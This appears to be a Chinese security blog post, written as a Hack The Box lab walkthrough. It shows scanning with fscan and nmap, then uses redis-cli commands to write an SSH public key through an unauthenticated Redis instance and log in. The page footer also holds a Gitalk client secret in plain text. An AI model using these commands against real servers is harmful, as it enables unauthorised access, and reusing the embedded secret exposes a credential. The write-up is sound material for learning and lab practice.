@@ -1,0 +1,358 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Redis未授权的美妙世界 | m1cr0fan&#39;sBlog</title>
+<link rel="shortcut icon" href="https://m1crofan.github.io/favicon.ico?v=1744119440243">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://m1crofan.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Redis未授权的美妙世界 | m1cr0fan&#39;sBlog - Atom Feed" href="https://m1crofan.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="在多次攻防项目中都碰到过redis未授权；但之前一直对这块不了解，用现成的梭哈工具都用不明白。但我又比较懒，懒得搭靶场。所以，找HTB中相关的靶场玩了。
+0x01 信息收集
+目标IP ： 10.10.10.160
+fscan扫一下
+./fs..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://m1crofan.github.io">
+  <img class="avatar" src="https://m1crofan.github.io/images/avatar.png?v=1744119440243" alt="">
+  </a>
+  <h1 class="site-title">
+    m1cr0fan&#39;sBlog
+  </h1>
+  <p class="site-description">
+    
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Redis未授权的美妙世界
+            </h2>
+            <div class="post-info">
+              <span>
+                2025-04-02
+              </span>
+              <span>
+                7 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <p>在多次攻防项目中都碰到过redis未授权；但之前一直对这块不了解，用现成的梭哈工具都用不明白。但我又比较懒，懒得搭靶场。所以，找HTB中相关的靶场玩了。</p>
+<h1 id="0x01-信息收集">0x01 信息收集</h1>
+<p>目标IP ： 10.10.10.160</p>
+<p>fscan扫一下</p>
+<pre><code class="language-shell">./fscan -h 10.10.10.160 -p 1-65535
+   ___                              _    
+  / _ \     ___  ___ _ __ __ _  ___| | __ 
+ / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    
+\____/     |___/\___|_|  \__,_|\___|_|\_\   
+                     fscan version: 1.8.4
+start infoscan
+10.10.10.160:22 open
+10.10.10.160:80 open
+10.10.10.160:6379 open
+10.10.10.160:10000 open
+[*] alive ports len is: 4
+start vulscan
+[*] WebTitle http://10.10.10.160       code:200 len:3844   title:The Cyber Geek's Personal Website
+[*] WebTitle https://10.10.10.160:10000 code:200 len:4566   title:Login to Webmin
+[+] Redis 10.10.10.160:6379 unauthorized file:/var/lib/redis/dump.rdb
+[+] Redis 10.10.10.160:6379 like can write /var/spool/cron/
+</code></pre>
+<p>可以看到 fscan扫出来<code>6379</code>这个redis相关端口，并且存在未授权。</p>
+<p>不知道是什么操作系统，掏出nmap再探测一下</p>
+<pre><code class="language-shell">sudo nmap -O &lt;目标IP地址&gt;
+</code></pre>
+<p>扫描发现 nmap也扫不出来</p>
+<h1 id="0x02-边界突破">0x02 边界突破</h1>
+<p>nmap扫描不出来，就只能靠redis的目录配置来确定了</p>
+<p>我先按照abc师傅在希谭实验室公众号分享的文章，配置一下利用环境：直接用Windows对redis linux进行利用。</p>
+<p>先下载一个redis-cli.exe</p>
+<p>https://github.com/redis-windows/redis-windows/releases</p>
+<h2 id="0x021-操作系统判断">0x02.1 操作系统判断</h2>
+<p>通过以下命令，判断是否为linux机器</p>
+<pre><code class="language-shell">config set dir /tmp
+D:\software\Redis-6.2.17\Redis-6.2.17-Windows-x64-cygwin&gt;redis-cli.exe -h 10.10.10.160
+10.10.10.160:6379&gt;
+10.10.10.160:6379&gt; config set dir /tmp
+OK
+(0.53s)
+</code></pre>
+<p>返回ok，说明是linux机器。</p>
+<h2 id="0x022-判断是否能写root下ssh">0x02.2 判断是否能写root下<code>.ssh</code></h2>
+<pre><code class="language-shell">10.10.10.160:6379&gt; config set dir /root/.ssh
+(error) ERR Changing directory: Permission denied
+</code></pre>
+<p>权限不够，不太彳亍。</p>
+<h2 id="0x023-回到redis默认安装路径">0x02.3 回到redis默认安装路径</h2>
+<p>我们回到redis默认安装路径，并判断该路径下是否存在<code>.ssh/</code>目录</p>
+<pre><code class="language-shell">10.10.10.160:6379&gt; config set dir /var/lib/redis/.ssh
+OK
+</code></pre>
+<p>可以发现，竟然存在！</p>
+<p>到这里会有两个疑问</p>
+<p>Q1：redis服务，一般都会有对应的redis用户吗？</p>
+<p>Q2：默认路径下，一般都会有<code>.ssh</code>目录吗?</p>
+<p>问大模型，它给出了如下解释</p>
+<p>A1：</p>
+<p><strong>通常情况下，为了安全起见，建议在 Linux 系统上为 Redis 服务创建一个专门的用户。</strong></p>
+<ul>
+<li><strong>安全考虑：</strong> 运行 Redis 服务通常不需要 root 权限。为了降低潜在的安全风险，最佳实践是创建一个非特权用户来运行 Redis 进程。这样，即使 Redis 服务出现漏洞，攻击者也无法直接获得 root 权限。</li>
+<li><strong>隔离和管理：</strong> 使用专门的用户可以更好地隔离 Redis 服务与其他系统进程，方便进行权限管理和资源控制。</li>
+</ul>
+<p>A2:</p>
+<p><strong>Redis 服务本身通常不会主动创建或使用</strong> <code>**.ssh**</code> <strong>目录。</strong></p>
+<ul>
+<li><code>**.ssh**</code> <strong>目录的作用：</strong><code>.ssh</code> 目录是用于存储用户的 SSH (Secure Shell) 密钥和配置文件的目录。它主要用于安全的远程登录和执行命令。</li>
+<li><strong>Redis 的功能：</strong> Redis 是一个内存中的数据结构存储系统，它主要用于数据缓存、消息队列等场景。它本身并不需要进行 SSH 连接来运行。</li>
+</ul>
+<p><strong>但是，存在以下几种可能导致 Redis 相关的</strong> <code>**.ssh**</code> <strong>目录的情况，但这并非 Redis 服务本身的特性：</strong></p>
+<ol>
+<li><strong>运行 Redis 服务的用户有自己的 SSH 配置：</strong> 如果你使用一个已经拥有 SSH 配置的用户（例如 <code>redis</code> 用户，如果它被创建来运行 Redis 并且也被用于其他目的），那么这个用户目录下自然会有 <code>.ssh</code> 目录。这与 Redis 服务本身无关。</li>
+<li><strong>人为创建：</strong> 有些用户可能会出于特定的管理或部署目的，手动在 Redis 的相关用户目录下创建 <code>.ssh</code> 目录。例如，可能用于通过 SSH 管理 Redis 服务器上的其他服务，但这与 Redis 进程的运行没有直接关系。</li>
+</ol>
+<h2 id="0x024-写入ssh公钥">0x02.4 写入ssh公钥</h2>
+<h3 id="生成公私钥对方法一命令行">生成公私钥对——方法一：命令行</h3>
+<p>可以使用如下命令生成一个公私钥对，其中目录<code>./ssh</code>是自定义的用于存在生成的公私钥。</p>
+<pre><code class="language-shell">ssh-keygen -t rsa -b 2048 -f ./ssh/id_rsa2048
+ubuntu@10-7-42-34:~$ ssh-keygen -t rsa -b 2048 -f ./ssh/id_rsa2048
+Generating public/private rsa key pair.
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in ./ssh/id_rsa2048
+Your public key has been saved in ./ssh/id_rsa2048.pub
+The key fingerprint is:
+SHA256:mPS7qgooVAF54PY8vbv5evSLvfo/MOU9OYKM1orjS+A ubuntu@10-7-42-34
+The key's randomart image is:
++---[RSA 2048]----+
+| o+.             |
+|.. ..            |
+| o..  .          |
+|. + .. +   .     |
+| . = .o S + . .  |
+|o . o .+ B o =   |
+|+  E o+ + o . o  |
+|..  .ooooo .     |
+|  ..oOO=+=+..    |
++----[SHA256]-----+
+</code></pre>
+<p>之后会提示设置一个密码短语；可以滞空。</p>
+<p>可以看到 在目录下生成了公私钥对</p>
+<pre><code class="language-shell">ubuntu@10-7-42-34:~/ssh$ ls
+id_rsa2048  id_rsa2048.pub
+</code></pre>
+<p>读取公钥</p>
+<pre><code class="language-shell">ubuntu@10-7-42-34:~/ssh$ cat *pub
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPA0/3YDeVSVsWNOEbnxgS9VIGktd++SJAX9Phy+gB5lDx5XZ3bXpDHcwridfAwCqQviSMjNPy+VtsmJoGihqhiMGruXxelRxZsLCQ+67T8lDJu1/4/D89hFZYsoM5R3DFeAYwKCar2vxnZrTXV+9lmEHbFXNoYVpBBH12BEbRCG2LVHe5k9vjorO6b/0fjcXl/UrA9cbRiE2ugZilphfz/aSzUMeyn0xdehLP5uK69myWVqQ5ldtW6PRFvN2J+Ecat+O7NOCddTnGa4f1gL59oE7Nv7gXg2P2VVbKQj9jdkPGeNi8HwU9wgz056IKc4bAGg2xTMpqVCDoC1gut7av ubuntu@10-7-42-34
+</code></pre>
+<p>写入到目标服务器的authorized_keys文件中。</p>
+<pre><code class="language-shell">set x &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPA0/3YDeVSVsWNOEbnxgS9VIGktd++SJAX9Phy+gB5lDx5XZ3bXpDHcwridfAwCqQviSMjNPy+VtsmJoGihqhiMGruXxelRxZsLCQ+67T8lDJu1/4/D89hFZYsoM5R3DFeAYwKCar2vxnZrTXV+9lmEHbFXNoYVpBBH12BEbRCG2LVHe5k9vjorO6b/0fjcXl/UrA9cbRiE2ugZilphfz/aSzUMeyn0xdehLP5uK69myWVqQ5ldtW6PRFvN2J+Ecat+O7NOCddTnGa4f1gL59oE7Nv7gXg2P2VVbKQj9jdkPGeNi8HwU9wgz056IKc4bAGg2xTMpqVCDoC1gut7av ubuntu@10-7-42-34&quot;
+</code></pre>
+<p>输入save，保存Redis配置并写入SSH公钥文件。</p>
+<h3 id="生成公私钥对方法二termius">生成公私钥对——方法二：Termius</h3>
+<p>我最爱的终端工具<code>Termius</code>，除了有好看的界面，也能生成公私钥对。</p>
+<figure data-type="image" tabindex="1"><img src="https://cdn.nlark.com/yuque/0/2025/png/1346970/1743559400376-c138fed3-18c7-4930-aedd-e9a4b78083a6.png" alt="img" loading="lazy"></figure>
+<p>选择RSA 2048 即可生成公私钥对</p>
+<figure data-type="image" tabindex="2"><img src="https://cdn.nlark.com/yuque/0/2025/png/1346970/1743559503797-ac0cfd86-6d62-4d8c-a767-5b2062384e78.png" alt="img" loading="lazy"></figure>
+<h2 id="0x025-登陆ssh">0x02.5 登陆ssh</h2>
+<p>发现无论是 方法一还是方法二 ；都无法免密登录</p>
+<figure data-type="image" tabindex="3"><img src="https://cdn.nlark.com/yuque/0/2025/png/1346970/1743560145012-e2385f38-60df-4be6-9fab-e7676278eebb.png" alt="img" loading="lazy"></figure>
+<p>猜测可能是写入公钥的时候，前后少了两个换行符<code>\n\n</code></p>
+<p>我们再次尝试：</p>
+<pre><code class="language-shell">10.10.10.160:6379&gt; set x &quot;\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDOuRcuXhZoAorW/qYWX4aaoAzMbSuR9NAV6K4/88CLwD30AMGq14YtgRwCeiZH1fWwNhOBIfafAlpraHvY4VoCuyRmXmRItgl13JEMUENOMxnD3EI4GhFea6keeUaSiSar3q5NmN3cVEvBeOhcvK643KndVFc5JLO6qD+8ScNrR8R5uf5XlLRUMT01D7jtUCLmvo1wNASPK8Mg9nS6p3nPSVDWvlPrTNdlSRCct6st0AUR9SU1WmJ4Ar6LLoSlrSGmM31RWR2agOzbzAY0eSezc7zNxEWh7jdbksA8kzCzdKqA3HUN6kEPTJHAZ5vDKxjXaz9K2aWnHHH48uxKKj9P Generated By Termius\n\n&quot;
+OK
+10.10.10.160:6379&gt; save
+OK
+(0.53s)
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://cdn.nlark.com/yuque/0/2025/png/1346970/1743560314977-7da7bfba-b097-4224-a249-0c49a117cf60.png" alt="img" loading="lazy"></figure>
+<p>这下成功了~</p>
+<h2 id="0x03-总结">0x03 总结</h2>
+<ul>
+<li>记得写公钥时前后加俩换行符<code>\n\n</code></li>
+<li>实战中可能没权限写入到root用户的<code>/.ssh</code>目录下；但如果当前用户有<code>/.ssh </code>目录；就可以写入。</li>
+</ul>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#0x01-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">0x01 信息收集</a></li>
+<li><a href="#0x02-%E8%BE%B9%E7%95%8C%E7%AA%81%E7%A0%B4">0x02 边界突破</a>
+<ul>
+<li><a href="#0x021-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%88%A4%E6%96%AD">0x02.1 操作系统判断</a></li>
+<li><a href="#0x022-%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E8%83%BD%E5%86%99root%E4%B8%8Bssh">0x02.2 判断是否能写root下<code>.ssh</code></a></li>
+<li><a href="#0x023-%E5%9B%9E%E5%88%B0redis%E9%BB%98%E8%AE%A4%E5%AE%89%E8%A3%85%E8%B7%AF%E5%BE%84">0x02.3 回到redis默认安装路径</a></li>
+<li><a href="#0x024-%E5%86%99%E5%85%A5ssh%E5%85%AC%E9%92%A5">0x02.4 写入ssh公钥</a>
+<ul>
+<li><a href="#%E7%94%9F%E6%88%90%E5%85%AC%E7%A7%81%E9%92%A5%E5%AF%B9%E6%96%B9%E6%B3%95%E4%B8%80%E5%91%BD%E4%BB%A4%E8%A1%8C">生成公私钥对——方法一：命令行</a></li>
+<li><a href="#%E7%94%9F%E6%88%90%E5%85%AC%E7%A7%81%E9%92%A5%E5%AF%B9%E6%96%B9%E6%B3%95%E4%BA%8Ctermius">生成公私钥对——方法二：Termius</a></li>
+</ul>
+</li>
+<li><a href="#0x025-%E7%99%BB%E9%99%86ssh">0x02.5 登陆ssh</a></li>
+<li><a href="#0x03-%E6%80%BB%E7%BB%93">0x03 总结</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://m1crofan.github.io/GbnvEYc0W_/">
+              <h3 class="post-title">
+                如何优雅玩HTB
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js"></script>
+<script>
+    // md5.min.js
+    !function(n){
+        "use strict";
+        function d(n,t){var r=(65535&n)+(65535&t);return(n>>16)+(t>>16)+(r>>16)<<16|65535&r}
+        function f(n,t,r,e,o,u){return d((c=d(d(t,n),d(e,u)))<<(f=o)|c>>>32-f,r);var c,f}
+        function l(n,t,r,e,o,u,c){return f(t&r|~t&e,n,t,o,u,c)}
+        function v(n,t,r,e,o,u,c){return f(t&e|r&~e,n,t,o,u,c)}
+        function g(n,t,r,e,o,u,c){return f(t^r^e,n,t,o,u,c)}
+        function m(n,t,r,e,o,u,c){return f(r^(t|~e),n,t,o,u,c)}
+        function i(n,t){var r,e,o,u,c;n[t>>5]|=128<<t%32,n[14+(t+64>>>9<<4)]=t;var f=1732584193,i=-271733879,a=-1732584194,h=271733878;for(r=0;r<n.length;r+=16)f=l(e=f,o=i,u=a,c=h,n[r],7,-680876936),h=l(h,f,i,a,n[r+1],12,-389564586),a=l(a,h,f,i,n[r+2],17,606105819),i=l(i,a,h,f,n[r+3],22,-1044525330),f=l(f,i,a,h,n[r+4],7,-176418897),h=l(h,f,i,a,n[r+5],12,1200080426),a=l(a,h,f,i,n[r+6],17,-1473231341),i=l(i,a,h,f,n[r+7],22,-45705983),f=l(f,i,a,h,n[r+8],7,1770035416),h=l(h,f,i,a,n[r+9],12,-1958414417),a=l(a,h,f,i,n[r+10],17,-42063),i=l(i,a,h,f,n[r+11],22,-1990404162),f=l(f,i,a,h,n[r+12],7,1804603682),h=l(h,f,i,a,n[r+13],12,-40341101),a=l(a,h,f,i,n[r+14],17,-1502002290),f=v(f,i=l(i,a,h,f,n[r+15],22,1236535329),a,h,n[r+1],5,-165796510),h=v(h,f,i,a,n[r+6],9,-1069501632),a=v(a,h,f,i,n[r+11],14,643717713),i=v(i,a,h,f,n[r],20,-373897302),f=v(f,i,a,h,n[r+5],5,-701558691),h=v(h,f,i,a,n[r+10],9,38016083),a=v(a,h,f,i,n[r+15],14,-660478335),i=v(i,a,h,f,n[r+4],20,-405537848),f=v(f,i,a,h,n[r+9],5,568446438),h=v(h,f,i,a,n[r+14],9,-1019803690),a=v(a,h,f,i,n[r+3],14,-187363961),i=v(i,a,h,f,n[r+8],20,1163531501),f=v(f,i,a,h,n[r+13],5,-1444681467),h=v(h,f,i,a,n[r+2],9,-51403784),a=v(a,h,f,i,n[r+7],14,1735328473),f=g(f,i=v(i,a,h,f,n[r+12],20,-1926607734),a,h,n[r+5],4,-378558),h=g(h,f,i,a,n[r+8],11,-2022574463),a=g(a,h,f,i,n[r+11],16,1839030562),i=g(i,a,h,f,n[r+14],23,-35309556),f=g(f,i,a,h,n[r+1],4,-1530992060),h=g(h,f,i,a,n[r+4],11,1272893353),a=g(a,h,f,i,n[r+7],16,-155497632),i=g(i,a,h,f,n[r+10],23,-1094730640),f=g(f,i,a,h,n[r+13],4,681279174),h=g(h,f,i,a,n[r],11,-358537222),a=g(a,h,f,i,n[r+3],16,-722521979),i=g(i,a,h,f,n[r+6],23,76029189),f=g(f,i,a,h,n[r+9],4,-640364487),h=g(h,f,i,a,n[r+12],11,-421815835),a=g(a,h,f,i,n[r+15],16,530742520),f=m(f,i=g(i,a,h,f,n[r+2],23,-995338651),a,h,n[r],6,-198630844),h=m(h,f,i,a,n[r+7],10,1126891415),a=m(a,h,f,i,n[r+14],15,-1416354905),i=m(i,a,h,f,n[r+5],21,-57434055),f=m(f,i,a,h,n[r+12],6,1700485571),h=m(h,f,i,a,n[r+3],10,-1894986606),a=m(a,h,f,i,n[r+10],15,-1051523),i=m(i,a,h,f,n[r+1],21,-2054922799),f=m(f,i,a,h,n[r+8],6,1873313359),h=m(h,f,i,a,n[r+15],10,-30611744),a=m(a,h,f,i,n[r+6],15,-1560198380),i=m(i,a,h,f,n[r+13],21,1309151649),f=m(f,i,a,h,n[r+4],6,-145523070),h=m(h,f,i,a,n[r+11],10,-1120210379),a=m(a,h,f,i,n[r+2],15,718787259),i=m(i,a,h,f,n[r+9],21,-343485551),f=d(f,e),i=d(i,o),a=d(a,u),h=d(h,c);return[f,i,a,h]}
+        function a(n){var t,r="",e=32*n.length;for(t=0;t<e;t+=8)r+=String.fromCharCode(n[t>>5]>>>t%32&255);return r}
+        function h(n){var t,r=[];for(r[(n.length>>2)-1]=void 0,t=0;t<r.length;t+=1)r[t]=0;var e=8*n.length;for(t=0;t<e;t+=8)r[t>>5]|=(255&n.charCodeAt(t/8))<<t%32;return r}
+        function e(n){var t,r,e="0123456789abcdef",o="";for(r=0;r<n.length;r+=1)t=n.charCodeAt(r),o+=e.charAt(t>>>4&15)+e.charAt(15&t);return o}
+        function r(n){return unescape(encodeURIComponent(n))}
+        function o(n){return a(i(h(t=r(n)),8*t.length));var t}
+        function u(n,t){return function(n,t){var r,e,o=h(n),u=[],c=[];for(u[15]=c[15]=void 0,16<o.length&&(o=i(o,8*n.length)),r=0;r<16;r+=1)u[r]=909522486^o[r],c[r]=1549556828^o[r];return e=i(u.concat(h(t)),512+8*t.length),a(i(c.concat(e),640))}(r(n),r(t))}
+        function t(n,t,r){return t?r?u(t,n):e(u(t,n)):r?o(n):e(o(n))}
+        "function"==typeof define&&define.amd?define(function(){return t}):"object"==typeof module&&module.exports?module.exports=t:n.md5=t;
+    }(this);
+</script>
+
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '60d1e67a466b7af7add7',
+    clientSecret: '7e64b888991fafb9802cd7551bba4ac683fd3273',
+    repo: 'm1crofan.github.io',
+    owner: 'm1crofan',
+    admin: ['m1crofan'],
+    id: md5(location.pathname),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false       // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  钢琴 住了几个妖~嘿嘿！ 邮箱 煮了几个馍~ 嘚嘚！
+  <a class="rss" href="https://m1crofan.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
